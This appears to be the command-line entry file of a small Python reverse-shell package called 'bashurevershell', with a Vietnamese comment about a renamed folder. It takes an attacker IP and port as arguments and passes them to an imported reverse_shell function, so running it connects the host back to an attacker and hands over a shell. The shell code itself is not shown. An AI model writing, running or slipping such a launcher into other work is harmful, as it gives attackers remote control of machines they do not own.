from bashurevershell.shell import reverse_shell  # ✅ Đổi đúng tên thư mục mới

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: python -m bashurevershell <attacker-ip> <port>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    reverse_shell(ip, port)
